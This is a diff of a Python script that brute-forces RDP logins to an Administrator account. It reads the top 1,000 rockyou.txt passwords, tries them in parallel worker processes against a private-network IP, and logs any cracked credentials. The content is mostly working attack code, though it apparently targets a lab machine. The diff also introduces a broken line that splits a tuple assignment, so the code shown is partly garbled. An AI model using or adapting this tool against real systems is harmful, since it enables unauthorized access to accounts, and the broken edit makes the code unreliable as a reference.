@@ -2,14 +2,14 @@ import subprocess
 from multiprocessing import Pool, Manager, cpu_count
 from collections import Counter
 
-# Configuration
-target_ip = "192.168.56.101"
+# Config
+target_ip = "192.168.137.128"
 username = "Administrator"
 rockyou_path = "/usr/share/wordlists/rockyou.txt"
 top_n = 1000
 success_log = "rdp_success.txt"
 
-# Extract top N passwords from rockyou.txt
+# Extract Top Passwords
 def get_top_passwords(filepath, top_n):
     with open(filepath, "r", encoding="latin-1", errors="ignore") as f:
         passwords = [line.strip() for line in f if line.strip()]
@@ -18,7 +18,8 @@ def get_top_passwords(filepath, top_n):
 
 # Worker function
 def attempt_login(args):
-    password, found_flag = args
+    password, found_flag
+    = args
     if found_flag.value:
         return None
 
@@ -39,33 +40,35 @@ def attempt_login(args):
                 f.write(f"{username}:{password}\n")
             return password
     except subprocess.TimeoutExpired:
-        print(f"[!] TIMEOUT: {password}")
-    except Exception as e:
-        print(f"[!] ERROR: {password} -> {str(e)}")
+        pass
+    except Exception:
+        pass
     return None
 
 # Main
 if __name__ == "__main__":
-    print(f"[*] Extracting top {top_n} passwords from rockyou.txt...")
+    print(f"[*] Extracting top {top_n} passwords...")
     passwords = get_top_passwords(rockyou_path, top_n)
 
     manager = Manager()
     found_flag = manager.Value('b', False)
 
-    print(f"[*] Starting RDP brute-force with {len(passwords)} passwords...")
-    with Pool(cpu_count() * 2) as pool:
+    print(f"[*] Starting brute-force with {len(passwords)} passwords...")
+    with Pool(processes=cpu_count() * 2) as pool:
         try:
-            args = [(password, found_flag) for password in passwords]
+            args = [(pw, found_flag) for pw in passwords]
             for result in pool.imap_unordered(attempt_login, args):
                 if result:
                     print(f"[+] Password cracked: {result}")
+                    pool.terminate()   # <<< Stop all workers
+                    pool.join()
                     break
         except KeyboardInterrupt:
-            print("\n[!] Interrupted by user. Exiting...")
+            print("\n[!] Interrupted by user.")
             pool.terminate()
         finally:
             pool.close()
             pool.join()
 
     if not found_flag.value:
-        print("[-] Password not found in top list.")
+        print("[-] Password not found.")
